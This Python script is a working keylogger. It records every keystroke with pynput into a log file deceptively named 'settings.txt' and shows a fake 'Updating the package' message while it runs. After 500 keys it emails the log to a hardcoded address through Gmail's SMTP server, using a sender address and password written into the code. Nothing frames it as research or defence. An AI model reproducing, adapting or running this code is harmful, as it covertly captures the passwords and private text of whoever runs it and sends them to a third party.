from pynput.keyboard import  Listener
import logging
import smtplib
import base64


#set the gmail credentiels of the sender and the mail of the reciever
gmail_user = 'alaa.besbes@gmail.com'
gmail_password = 'RLstdar7'
gmail_receiver='besbesalaa@gmail.com'
sent_from = gmail_user
to = [gmail_user, gmail_receiver]
def sendMail():

    filename = "settings.txt"

    # Read a file and encode it into base64 format
    fo = open(filename, "r")
    filecontent = fo.read()

    marker = "AUNIQUEMARKER"
    body ="""
    This is a test email to send an attachement.
    """
    # Define the main headers.
    part1 = """From: From Person <me@fromdomain.net>
    To: To Person <amrood.admin@gmail.com>
    Subject: Sending Attachement
    MIME-Version: 1.0
    Content-Type: multipart/mixed; boundary=%s
    --%s
    """ % (marker, marker)

    # Define the message action
    part2 = """Content-Type: text/plain
    Content-Transfer-Encoding:8bit
    %s
    --%s
    """ % (body,marker)

    # Define the attachment section
    part3 = """Content-Type: multipart/mixed; name=\"%s\"
    Content-Transfer-Encoding:base64
    Content-Disposition: attachment; filename=%s

    %s
    --%s--
    """ %(filename, filename,filecontent, marker)
    message = part1 + part2 + part3

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, message)
        server.close()
        print ("...........")
    except Exception:
        print ("Error: Please restart and retry")

logging.basicConfig(filename=("settings.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
global log 
log = []
def on_press(key):
    logging.info(str(key))
    ListOfGloabals = globals()
    log=ListOfGloabals['log']
    log.append(str(key))
    if(len(log)>=500):

        log.clear()
        sendMail()

print("Updating the package, this will take few minutes ....... ")
with Listener(on_press=on_press) as listener:
    listener.join()
    